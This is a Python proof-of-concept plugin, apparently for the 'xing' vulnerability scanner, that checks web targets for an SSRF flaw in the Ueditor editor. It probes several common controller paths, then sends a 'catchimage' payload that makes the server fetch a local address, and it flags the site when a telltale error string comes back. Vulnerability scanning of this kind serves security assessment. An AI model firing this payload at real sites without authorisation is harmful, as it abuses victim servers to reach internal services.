from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Ueditor SSRF 漏洞"
        self.app_name = 'Ueditor'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]


    def verify(self, target):
        payload = "?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png"
        check = b"\\u94fe\\u63a5\\u4e0d\\u53ef\\u7528"
        paths = ["/ueditor/php/controller.php", "/Public/ueditor/php/controller.php"]
        paths.extend(["/js/ueditor/php/controller.php"])
        paths.extend(["/statics/ueditor/php/controller.php"])
        paths.extend(["/module/ueditor/php/controller.php"])

        check_paths = [b'{"state":"\\u8bf7\\u6c42\\u5730\\u5740\\u51fa\\u9519"}']
        check_paths.extend([b'{"state": "\u65e0\u6548\u7684Action"}'])
        check_paths.extend([b'upload method not exists'])

        self.logger.info("verify {}".format(target))

        for path in paths:
            url = target + path
            conn = http_req(url)
            for check_path in check_paths:
                if check_path in conn.content and b"<" not in conn.content:
                    self.logger.info("found ueditor controller {}".format(url))
                    ssrf_url = url + payload
                    conn_ssrf = http_req(ssrf_url)
                    if check in conn_ssrf.content and b"<" not in conn_ssrf.content:
                        self.logger.success("found vul {}".format(ssrf_url))
                        return ssrf_url
                    return